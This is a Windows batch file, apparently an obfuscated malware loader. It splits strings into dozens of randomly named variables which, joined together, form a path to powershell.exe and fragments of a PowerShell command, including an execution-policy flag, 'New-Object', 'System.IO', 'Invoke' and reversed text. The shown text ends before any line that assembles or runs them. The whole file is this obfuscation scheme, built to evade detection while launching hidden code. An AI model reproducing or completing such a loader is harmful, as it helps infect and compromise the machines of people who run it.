@echo off
set "LRroEBdYsG=xe"
set "wDGQLibHZg=nd"
set "dSNPRZkIDB=32"
set "KjXgwGtDdU=co"
set "dmeRuQCtYC=in"
set "zQoEsTTGlz=0\"
set "CdxZwXaNJV=Wi"
set "BJLaQZENfO=we"
set "xQKaFaPinD=we"
set "uNoCgLmFRH=ws"
set "kOsqjRNWva=Po"
set "YhTbNRgJAI=:\"
set "QzJuMEvSdb=st"
set "bCZEOQziCg=y "
set "CaEgiaHFIE=py"
set "VaagXQenOs=ll"
set "pWMZbuAdqE=Sy"
set "WdroXQGRmT=\v"
set "JtiBdpXCKI=rS"
set "mJFEMBEntB=po"
set "TklMvAotHy=1."
set "CCiqhpJwVy= C"
set "WXIEVvhCtr=ow"
set "UYeacyeiTj=s\"
set "XZGNHjFGZU=he"
set "PyusbyzGNm=em"
set "pgAxkBdgXG=.e"
set "kPzBpDdoXg=ll"
set "pKGyGfPNWe=rs"
set "uXNkSoKzBQ= /"
set "UemOBuoKnx=\W"
set "EWCqshBYUJ=he"
set "VTpdAXLUCM=do"
set "JHGdcXoQrS=cd"
set "GAeJCZhdpT= %~dp0"
set "VHHEejKXeo=ew-O"
set "kRWbeupRkU=();$"
set "zkbEZQfEEi=xCXA"
set "WjqYhoYeuq=]::C"
set "ByDGsZZYsz=ewLi"
set "YKZFuTrTSW=ring"
set "uEOWyxjYVB=ress"
set "BUKHanpmoJ=-ep "
set "uorzNvlOua=morF"
set "HPCLKmribH=em.I"
set "zFSoomgvim=);$j"
set "OrwWCMnCAs=W.En"
set "qIVzfgjSqe='txe"
set "KezIwufTlz=ke($"
